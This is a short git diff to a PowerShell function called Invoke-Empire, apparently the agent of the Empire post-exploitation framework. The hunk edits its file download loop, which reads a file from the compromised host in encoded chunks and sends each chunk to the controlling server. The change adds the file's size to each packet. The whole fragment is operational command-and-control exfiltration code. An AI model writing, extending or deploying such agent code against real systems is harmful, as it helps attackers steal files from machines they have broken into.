@@ -847,9 +847,10 @@ function Invoke-Empire {
                         $Index = 0
                         do{
                             $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
+                            $filesize = (Get-Item $file).length
 
                             if($EncodedPart) {
-                                $data = "{0}|{1}|{2}" -f $Index, $file, $EncodedPart
+                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart
                                 (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
                                 $Index += 1
 
